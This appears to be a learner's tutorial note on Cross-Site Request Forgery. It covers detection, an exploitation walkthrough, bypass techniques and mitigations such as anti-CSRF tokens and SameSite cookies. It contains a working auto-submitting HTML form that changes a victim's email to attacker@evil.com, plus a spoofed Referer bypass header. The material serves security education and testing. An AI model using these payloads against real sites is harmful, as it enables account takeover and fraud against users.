# Cross-Site Request Forgery (CSRF)

## 📌 Overview

Cross-Site Request Forgery (CSRF) is a web security vulnerability that forces authenticated users to perform unintended actions on a web application without their consent.

A successful CSRF attack abuses the trust that a website has in a user's browser.

If a victim is authenticated to a vulnerable application, an attacker can trick them into sending malicious requests that execute actions using the victim’s session.

---

# 🧠 What is CSRF?

CSRF occurs when:

* A user is authenticated to a target website
* The application relies only on cookies for authentication
* The server fails to verify whether requests are intentionally made by the user

Attackers exploit this by creating malicious pages that automatically send forged requests.

---

# 🔥 Common Attack Targets

CSRF attacks commonly target:

* Password changes
* Email changes
* Money transfers
* Profile updates
* Account deletion
* Administrative actions

---

# 🔍 Identifying CSRF Vulnerabilities

## Common Indicators

* No CSRF token present
* Predictable CSRF tokens
* Token not validated properly
* Session-only authentication
* State-changing requests via GET
* Missing SameSite cookie protections

---

# 🚀 Exploitation Methodology

## Step 1 — Capture a Sensitive Request

Intercept a request using Burp Suite.

Example:

```http id="2j8mva"
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=xyz123

email=attacker@evil.com
```

---

## Step 2 — Check for CSRF Protection

Verify whether:

* CSRF tokens exist
* Tokens are validated
* Referer/Origin checks exist

---

## Step 3 — Create a Malicious HTML Form

Example exploit:

```html id="x4vwfr"
<html>
<body>
<form action="https://vulnerable-website.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
</body>
</html>
```

---

## Step 4 — Deliver the Exploit

The attacker tricks the victim into visiting the malicious page.

The browser automatically includes the victim’s session cookies, causing the request to execute successfully.

---

# 💥 Common CSRF Bypasses

## Token Validation Bypass

* Token duplicated in cookie
* Token not tied to session
* Empty token accepted
* Method-based validation flaws

---

## Referer Validation Bypass

Example:

```http id="r3ykqf"
Referer: https://trusted-site.com.attacker.com
```

Weak substring checks may allow bypasses.

---

## SameSite Bypass

Certain browser behaviors or application flows may bypass weak SameSite configurations.

---

# ⚠ Impact

Successful CSRF attacks may lead to:

* Account takeover
* Unauthorized account changes
* Financial fraud
* Administrative compromise
* Data manipulation

---

# 🛡 Prevention

## Recommended Mitigations

### Use Anti-CSRF Tokens

Each sensitive request should contain:

* Unique
* Unpredictable
* Session-bound tokens

---

### Validate Origin & Referer Headers

Verify requests originate from trusted domains.

---

### Use SameSite Cookies

Recommended setting:

```http id="l9gx5v"
Set-Cookie: session=xyz123; SameSite=Lax; Secure; HttpOnly
```

---

### Require Re-Authentication

For highly sensitive actions:

* Password confirmation
* MFA verification

---

# 🧰 Tools Used

* Burp Suite
* Burp Repeater
* Browser Developer Tools
* PortSwigger Web Security Academy

---

# 📚 Key Learning

CSRF vulnerabilities exploit implicit browser trust in authenticated sessions.

Understanding how browsers automatically include cookies is essential for identifying and exploiting CSRF flaws during web application testing.

---

# 🏷 Tags

`#CSRF` `#WebSecurity` `#BurpSuite` `#OWASP` `#Authentication`
